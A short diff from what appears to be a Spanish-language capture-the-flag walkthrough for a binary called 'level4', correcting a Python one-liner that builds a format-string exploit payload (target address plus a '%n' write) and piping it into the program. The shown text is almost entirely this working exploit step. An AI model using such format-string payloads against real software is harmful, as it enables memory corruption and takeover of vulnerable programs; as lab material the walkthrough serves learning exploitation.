@@ -92,7 +92,7 @@
 
 12.- La cadena debe quedar así
   python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/payload
-  python -c 'import sys; sys.stdout.buffer.write(b"\x10\x98\x04\x08" + b"%16930112d%4$n")' > payload
+  python -c 'import sys; sys.stdout.buffer.write(b"\x10\x98\x04\x08" + b"%16930112d%12$n")' > payload
 
 13.- Ejecutamos el binario y le pasamos la cadena formateada
   cat /tmp/payload - | ./level4
